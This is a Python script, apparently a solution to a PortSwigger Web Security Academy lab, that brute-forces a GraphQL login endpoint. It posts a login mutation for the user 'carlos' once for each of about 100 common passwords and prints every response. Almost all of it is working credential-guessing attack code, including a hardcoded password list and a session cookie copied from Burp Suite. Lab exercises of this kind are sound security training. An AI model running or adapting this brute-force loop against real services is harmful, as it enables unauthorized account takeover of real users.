import requests

text="""password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
7777777
121212
000000
qazwsx
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow"""

passwords= text.splitlines()
#passwords= ",".join(words)


burp0_url = "https://0a14004304a0cba3817cd9800068002a.web-security-academy.net:443/graphql/v1"
burp0_cookies = {"session": "BY7O66eBLY2oZw1aT6q49Gm0DBn6RyNI"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0a14004304a0cba3817cd9800068002a.web-security-academy.net/login", "Content-Type": "application/json", "Origin": "https://0a14004304a0cba3817cd9800068002a.web-security-academy.net", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}


for p in passwords:
    burp0_json = {
        "query": f"""mutation login {{
    login_1: login(input: {{ username: "carlos", password: "{p}" }}) {{
        token
        success
    }}
}}""",
        "variables": {}
    }
    responce=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    print(burp0_json)
    print(responce.text)
    
    #if ("true") in responce.text:
     #   print ("the correct password is " + )